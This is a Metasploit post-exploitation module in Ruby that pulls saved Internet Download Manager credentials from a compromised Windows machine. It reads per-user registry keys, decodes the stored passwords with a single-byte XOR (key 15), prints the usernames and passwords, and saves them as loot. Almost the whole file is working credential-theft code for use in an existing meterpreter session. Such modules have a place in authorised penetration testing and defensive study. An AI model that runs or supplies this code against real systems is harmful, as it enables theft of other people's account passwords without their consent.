##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Internet Download Manager (IDM) Password Extractor',
      'Description'   => %q{
          This module recovers the saved premium download account passwords from
        Internet Download Manager (IDM). These passwords are stored in an encoded
        format in the registry. This module traverses through these registry entries
        and decodes them. Thanks to the template code of theLightCosine's CoreFTP
        password module.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'sil3ntdre4m <sil3ntdre4m[at]gmail.com>',
          'SecurityXploded Team <contact[at]securityxploded.com>'
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    creds = Rex::Ui::Text::Table.new(
        'Header'  => 'Internet Downloader Manager Credentials',
        'Indent'   => 1,
        'Columns' =>
        [
          'User',
          'Password',
          'Site'
        ]
      )

    registry_enumkeys('HKU').each do |k|
      next unless k.include? "S-1-5-21"
      next if k.include? "_Classes"

      print_status("Looking at Key #{k}")

      begin
        subkeys = registry_enumkeys("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\")
        if subkeys.nil? or subkeys.empty?
          print_status ("IDM not installed for this user.")
          return
        end

        subkeys.each do |site|
          user = registry_getvaldata("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\#{site}", "User")
          epass = registry_getvaldata("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\#{site}", "EncPassword")
          next if epass == nil or epass == ""
          pass = xor(epass)
          print_good("Site: #{site} (User=#{user}, Password=#{pass})")
          creds << [user, pass, site]
        end

        print_status("Storing data...")
        path = store_loot(
          'idm.user.creds',
          'text/csv',
          session,
          creds.to_csv,
          'idm_user_creds.csv',
          'Internet Download Manager User Credentials'
        )

        print_status("IDM user credentials saved in: #{path}")

      rescue ::Exception => e
        print_error("An error has occurred: #{e.to_s}")
      end

    end
  end

  def xor(ciphertext)
    pass = ciphertext.unpack("C*")
    key=15
    for i in 0 .. pass.length-1 do
    pass[i] ^= key
    end
    return pass.pack("C*")
  end

end
